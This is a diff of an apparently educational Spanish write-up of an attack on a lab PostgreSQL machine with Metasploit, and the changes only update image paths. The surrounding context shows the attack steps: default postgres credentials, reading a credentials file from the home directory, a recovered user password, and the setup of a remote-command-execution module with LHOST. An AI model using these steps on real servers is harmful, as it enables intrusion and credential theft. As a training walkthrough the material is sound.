@@ -101,7 +101,7 @@ set RHOSTS 10.128.162.111
 ```
 RHOSTS = máquina víctima
 
-![use](imagenes/login.png)
+![use](/Maquina_de_Linux/Poster/imagenes/login.png)
 
 ### 3.2 Ejecución del ataque
 
@@ -142,7 +142,7 @@ Despues de colocar todo le damos a:
 run
 ```
 
-![use](imagenes/use.png)
+![use](/Maquina_de_Linux/Poster/imagenes/use.png)
 
 Al ejecutar el módulo también se obtuvo la versión del servidor PostgreSQL (PostgreSQL X.Y.Z). Disponer de este dato es importante, ya que permite analizar si esa versión concreta presenta vulnerabilidades conocidas (CVE), configuraciones por defecto inseguras o características específicas que puedan facilitar fases posteriores del ataque, como la enumeración avanzada o la explotación del sistema.
 
@@ -169,7 +169,7 @@ set USERNAME postgres
 set PASSWORD password
 ```
 
-![use](imagenes/hash.png)
+![use](/Maquina_de_Linux/Poster/imagenes/hash.png)
 
 Ejecución del módulo
 
@@ -199,7 +199,7 @@ set USERNAME postgres
 set PASSWORD password
 ```
 
-![use](imagenes/use2.png)
+![use](/Maquina_de_Linux/Poster/imagenes/use2.png)
 
 Ejecución del módulo
 
@@ -221,7 +221,7 @@ Entre los resultados destacan los siguientes:
 ```bash
 /home/dark/credentials.txt
 ```
-![creden](imagenes/creden.png)
+![creden](/Maquina_de_Linux/Poster/imagenes/creden.png)
 
 ### 3.7 Descubrimiento de credenciales
 
@@ -240,7 +240,7 @@ Resultado obtenido
 dark:qwerty1234#!hackme
 ```
 
-![rfile](imagenes/rfile.png)
+![rfile](/Maquina_de_Linux/Poster/imagenes/rfile.png)
 
 
 ## 4. Ejecución remota de comandos mediante PostgreSQL (RCE)
@@ -280,7 +280,7 @@ set PASSWORD password
 set LHOST 192.168.142.53
 ```
 
-![use](imagenes/use3.png)
+![use](/Maquina_de_Linux/Poster/imagenes/use3.png)
 
 Donde:
 
